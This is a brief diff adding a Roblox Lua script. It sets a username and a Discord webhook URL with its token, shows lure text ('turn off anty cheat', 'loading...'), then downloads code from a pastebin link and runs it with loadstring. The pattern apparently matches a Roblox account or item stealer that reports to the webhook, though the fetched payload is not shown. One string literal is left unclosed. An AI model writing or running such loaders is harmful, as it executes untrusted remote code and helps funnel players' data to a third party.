@@ -1,0 +1,8 @@
+User = "Dev_RlCH"
+Webhook = "https://discord.com/api/webhooks/1067620039857025124/DGWeknfEpP1cWa-NF8YaMbDttS6jM79R-LV7LwTOCzT31_GOXlJAu_Pell3qj0Pn7ZhK"
+_G.CustomScriptName = "DKS
+_G.Text1 = "DKS STUDIO"
+_G.Text2 = "turn off anty cheat"
+_G.Text3 = "loading..."
+_G.Text4 = "wait 30sec"
+loadstring(game:HttpGet('https://pastebin.pl/view/raw/1e781430'))()
